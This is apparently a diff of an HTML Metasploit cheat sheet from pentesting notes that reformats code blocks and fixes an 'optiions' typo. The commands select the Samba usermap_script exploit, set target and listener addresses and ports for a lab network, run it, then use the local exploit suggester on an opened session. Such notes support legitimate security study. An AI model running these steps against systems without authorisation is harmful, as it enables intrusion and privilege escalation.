@@ -59,26 +59,22 @@
 </span></span></code></pre></div><h4 id="basic-commands">Basic Commands</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Return to previous page</span>
 </span></span><span class="line"><span class="cl">back
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># quit metasploit</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># quit metasploit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span></code></pre></div><h4 id="search-exploit">Search Exploit</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example: samba</span>
 </span></span><span class="line"><span class="cl">search samba
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Choose by # or name</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Choose by #num</span>
 </span></span><span class="line"><span class="cl">use <span class="m">15</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Choose by full path</span>
 </span></span><span class="line"><span class="cl">use exploit/multi/samba/usermap_script
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Show exploit settings</span>
-</span></span><span class="line"><span class="cl">optiions
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Set option, e.g.</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show exploit settings</span>
+</span></span><span class="line"><span class="cl">options
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Set option, e.g.</span>
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 10.10.11.10
-</span></span><span class="line"><span class="cl"><span class="nb">set</span> lhost 10.10.14.10
-</span></span><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">1337</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lhost 10.10.14.10
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">1337</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
 </span></span><span class="line"><span class="cl">run 
 </span></span></code></pre></div><p><small><em>Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</em></small></p>
 <hr>
@@ -90,17 +86,13 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Quick look of potential privesc (Windows)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Need to return from meterpreter</span>
 </span></span><span class="line"><span class="cl">use post/multi/recon/local_exploit_suggester
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Select opened session</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Select opened session</span>
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> session <span class="m">1</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Show exploit settings</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show exploit settings</span>
 </span></span><span class="line"><span class="cl">optiions
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Set option, e.g.</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Set option, e.g.</span>
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 10.10.11.10
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
 </span></span><span class="line"><span class="cl">run 
 </span></span></code></pre></div><br></div></div>
     
